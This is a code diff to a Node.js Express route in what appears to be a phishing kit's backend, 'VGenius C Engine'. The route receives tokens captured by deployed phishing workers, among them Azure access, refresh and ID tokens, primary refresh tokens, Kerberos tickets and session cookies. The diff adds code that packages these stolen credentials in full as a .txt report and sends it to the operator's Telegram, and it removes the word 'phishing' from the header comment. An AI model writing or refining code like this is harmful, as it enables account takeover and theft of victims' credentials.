@@ -1,6 +1,6 @@
 /**
  * VGenius C Engine - Token Capture Routes
- * Receives tokens from deployed phishing workers
+ * Receives tokens from deployed workers
  */
 const express = require('express');
 const router = express.Router();
@@ -9,8 +9,163 @@ const db = require('../database/connection');
 const config = require('../config/env');
 const { encrypt } = require('../utils/encrypt');
 const { processCookieConversion } = require('../services/cookieconverter');
-const { sendTelegramNotification } = require('../services/notification');
+const { sendTelegramDocument } = require('../services/notification');
 const { validateResult, commonValidators } = require('../middleware/validator');
+
+// --- Telegram capture-report helpers --------------------------------------------
+// Captures can contain very long token + cookie payloads that blow past
+// Telegram's 4096-char sendMessage limit, so we deliver the full data as a
+// .txt document (sendDocument) and keep a short HTML caption (<=1024 chars)
+// with the summary. Building entities from char codes so the literals are
+// not altered by tooling/runtime HTML rendering.
+const AMP = String.fromCharCode(38) + 'amp;'; // &
+const LT = String.fromCharCode(38) + 'lt;';  // <
+const GT = String.fromCharCode(38) + 'gt;';  // >
+const esc = (val) => {
+    if (val === null || val === undefined) return 'N/A';
+    const s = typeof val === 'string' ? val : JSON.stringify(val);
+    return s.replace(/&/g, AMP).replace(/</g, LT).replace(/>/g, GT);
+};
+
+/**
+ * Build a short HTML caption (<=1024 chars) summarising the capture.
+ * Used as the caption of the Telegram document.
+ */
+function buildCaptureCaption(data) {
+    const {
+        email, templateType, tokenType, accountType, tenant, ip,
+        cookieCount, linkId, tokenId,
+    } = data;
+
+    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+    const label = tokenType === 'cookie' ? 'COOKIE + TOKENS' : 'TOKEN';
+    const lines = [];
+
+    lines.push(`🚨 <b>NEW CAPTURE - ${label}</b>`);
+    lines.push(`👤 <b>Email:</b> ${esc(email || 'unknown')}`);
+    lines.push(`🏷️ <b>Account:</b> ${esc(accountType)} | <b>Tenant:</b> ${esc(tenant)}`);
+    lines.push(`🌐 <b>Template:</b> ${esc(templateType)}`);
+    lines.push(`🌍 <b>IP:</b> ${esc(ip || '0.0.0.0')}`);
+    if (tokenType === 'cookie' && (cookieCount || cookieCount === 0)) {
+        lines.push(`🍪 <b>Cookies:</b> ${esc(cookieCount)}`);
+    }
+    lines.push(`🔗 <b>Link:</b> ${esc(linkId)} | <b>Token ID:</b> ${esc(tokenId)}`);
+    lines.push(`📅 <b>Time:</b> ${esc(stamp)}`);
+    lines.push(`✅ Full tokens${tokenType === 'cookie' ? ' + cookies' : ''} in attached .txt`);
+
+    return lines.join('\n');
+}
+
+/**
+ * Build the full plain-text body of the .txt file sent with the capture.
+ * No truncation, no HTML escaping — raw copy-paste-ready values.
+ */
+function buildCaptureFileContent(data) {
+    const {
+        email, templateType, tokenType, accessToken, refreshToken, idToken,
+        prt, sessionKeyJwe, deviceTenantId, tgtAd, tgtCloud,
+        kerberosTopLevelNames, tgtCloudSessionkey, accountType, tenant, ip,
+        cookieCount, cookieSample, userAgent, linkId, tokenId,
+    } = data;
+
+    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+    const sep = '========================================';
+    const out = [];
+
+    out.push('VGENIUS CAPTURE REPORT');
+    out.push(sep);
+    out.push(`Type:        ${tokenType === 'cookie' ? 'COOKIE + TOKEN' : 'TOKEN'}`);
+    out.push(`Token ID:    ${tokenId}`);
+    out.push(`Link ID:     ${linkId}`);
+    out.push(`Email:       ${email || 'unknown'}`);
+    out.push(`Account:     ${accountType}`);
+    out.push(`Tenant:      ${tenant}`);
+    out.push(`Template:    ${templateType}`);
+    out.push(`IP:          ${ip || '0.0.0.0'}`);
+    out.push(`User-Agent:  ${userAgent || 'Phishing Worker'}`);
+    out.push(`Captured:    ${stamp}`);
+    out.push(sep);
+
+    out.push('ACCESS TOKEN:');
+    out.push(accessToken || 'N/A');
+    out.push('');
+
+    if (idToken) {
+        out.push('ID TOKEN:');
+        out.push(idToken);
+        out.push('');
+    }
+
+    if (prt) {
+        out.push('PRT / REFRESH TOKEN:');
+        out.push(prt);
+        out.push('');
+    }
+
+    if (refreshToken && refreshToken !== prt) {
+        out.push('REFRESH TOKEN:');
+        out.push(refreshToken);
+        out.push('');
+    }
+
+    if (sessionKeyJwe) {
+        out.push('SESSION KEY (JWE):');
+        out.push(sessionKeyJwe);
+        out.push('');
+    }
+
+    if (deviceTenantId) {
+        out.push('DEVICE TENANT ID:');
+        out.push(deviceTenantId);
+        out.push('');
+    }
+
+    if (tgtAd) {
+        out.push('TGT AD:');
+        out.push(tgtAd);
+        out.push('');
+    }
+
+    if (tgtCloud) {
+        out.push('TGT CLOUD:');
+        out.push(tgtCloud);
+        out.push('');
+    }
+
+    if (tgtCloudSessionkey) {
+        out.push('TGT CLOUD SESSION KEY:');
+        out.push(tgtCloudSessionkey);
+        out.push('');
+    }
+
+    if (kerberosTopLevelNames) {
+        out.push('KERBEROS TOP LEVEL NAMES:');
+        out.push(kerberosTopLevelNames);
+        out.push('');
+    }
+
+    if (tokenType === 'cookie' && (cookieSample || cookieCount)) {
+        out.push(sep);
+        out.push(`COOKIES (${cookieCount || 0} cookies):`);
+        out.push(cookieSample || 'N/A');
+        out.push('');
+    }
+
+    out.push(sep);
+    out.push('END OF REPORT');
+    return out.join('\n');
+}
+
+/**
+ * Send a capture report to the user's Telegram: a .txt document containing
+ * the full tokens + cookies, with a short HTML caption summary.
+ */
+function sendCaptureReport(userId, data) {
+    const caption = buildCaptureCaption(data);
+    const fileContent = buildCaptureFileContent(data);
+    const filename = `capture_${data.tokenId}_${data.tokenType || 'token'}.txt`;
+    return sendTelegramDocument(userId, filename, fileContent, caption);
+}
 
 // POST /api/capture - receives tokens from the phishing worker
 router.post('/', commonValidators.captureToken, validateResult, async (req, res) => {
@@ -159,11 +314,10 @@ router.post('/', commonValidators.captureToken, validateResult, async (req, res)
 
     const tokenId = result.insertId;
 
-    // Build base notification message with all captured tokens
-    const baseNotification = buildCaptureNotification({
+    // Common capture data shared by both the token-only and cookie paths
+    const captureData = {
         email,
         templateType: link.template_type,
-        tokenType: 'token',
         accessToken: access_token,
         refreshToken: prt,
         idToken: id_token,
@@ -180,7 +334,7 @@ router.post('/', commonValidators.captureToken, validateResult, async (req, res)
         userAgent: user_agent,
         linkId: link_id,
         tokenId,
-    });
+    };
 
     // If link is in cookie mode, trigger cookie conversion asynchronously
     // PASS TENANT AND ACCOUNT TYPE TO AVOID AADSTS ERRORS
@@ -196,36 +350,18 @@ router.post('/', commonValidators.captureToken, validateResult, async (req, res)
                         created_at: new Date()
                     });
                 }
-                // Build notification WITH cookie data
-                const messageWithCookies = buildCaptureNotification({
-                    email,
-                    templateType: link.template_type,
+                // Send report WITH cookie data (full tokens + cookies .txt)
+                sendCaptureReport(user_id, {
+                    ...captureData,
                     tokenType: 'cookie',
-                    accessToken: access_token,
-                    refreshToken: prt,
-                    idToken: id_token,
-                    prt,
-                    sessionKeyJwe,
-                    deviceTenantId,
-                    tgtAd,
-                    tgtCloud,
-                    kerberosTopLevelNames,
-                    tgtCloudSessionkey,
-                    accountType,
-                    tenant,
-                    ip,
                     cookieCount: cookieResult.cookie_count,
                     cookieSample: cookieResult.cookies,
-                    userAgent: user_agent,
-                    linkId: link_id,
-                    tokenId,
                 });
-                sendTelegramNotification(user_id, messageWithCookies);
             })
             .catch(err => {
                 console.error('[Capture] Cookie conversion failed:', err.message);
-                // Send base notification (tokens only) if cookie conversion fails
-                sendTelegramNotification(user_id, baseNotification);
+                // Send tokens-only report (.txt) if cookie conversion fails
+                sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
             });
     } else {
         const io = req.app.get('io');
@@ -237,8 +373,8 @@ router.post('/', commonValidators.captureToken, validateResult, async (req, res)
                 created_at: new Date()
             });
         }
-        // Send notification with all captured token data
-        sendTelegramNotification(user_id, baseNotification);
+        // Send tokens-only report (.txt document) with short HTML caption
+        sendCaptureReport(user_id, { ...captureData, tokenType: 'token' });
     }
 
     res.status(200).json({ success: true, token_id: tokenId });
